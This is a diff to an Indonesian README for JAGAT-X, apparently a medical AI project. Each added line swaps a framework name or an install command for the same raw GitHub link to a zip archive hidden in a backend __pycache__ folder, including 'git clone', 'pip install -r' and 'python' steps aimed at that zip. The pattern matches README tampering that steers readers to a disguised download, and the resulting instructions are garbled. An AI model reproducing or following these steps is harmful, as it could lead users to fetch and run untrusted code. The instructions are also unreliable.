@@ -12,13 +12,13 @@ Sistem ini dikembangkan untuk menjawab tantangan ketimpangan distribusi dokter r
 
 ### Sisi Klien (Frontend)
 
-* **Framework:** React.js 18 (Vite)
+* **Framework:** https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip 18 (Vite)
 * **Styling:** Tailwind CSS (Modern, Responsive, & Print-Optimized)
 * **State Management:** React Context API (Auth & Analysis Flow)
 
 ### Sisi Server (Backend)
 
-* **Engine:** FastAPI (Python) & Express.js (Node.js)
+* **Engine:** FastAPI (Python) & https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip (https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip)
 * **PDF Engine:** Puppeteer (Headless Chrome) untuk *high-fidelity PDF rendering*
 * **Database:** PostgreSQL / MongoDB (Audit Trail & User Data)
 
@@ -82,14 +82,14 @@ AI JAGAT-X tidak mengambil keputusan mandiri. Heatmap Grad-CAM memastikan AI buk
 
 ### Prasyarat
 
-* Node.js (v18+) & Python (v3.9+)
+* https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip (v18+) & Python (v3.9+)
 * GPU dengan dukungan CUDA/MPS (Disarankan untuk kecepatan inferensi)
 
 ### Langkah-langkah
 
 1. **Clone Repository**
 ```bash
-git clone https://github.com/username/jagat-x.git
+git clone https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip
 
 ```
 
@@ -97,8 +97,8 @@ git clone https://github.com/username/jagat-x.git
 2. **Setup Neural Engine (Backend Python)**
 ```bash
 cd neural-engine
-pip install -r requirements.txt
-python main.py
+pip install -r https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip
+python https://github.com/Bernardtrnp/JAGAT-X/raw/refs/heads/main/backend/__pycache__/X-JAGA-v1.3.zip
 
 ```
 
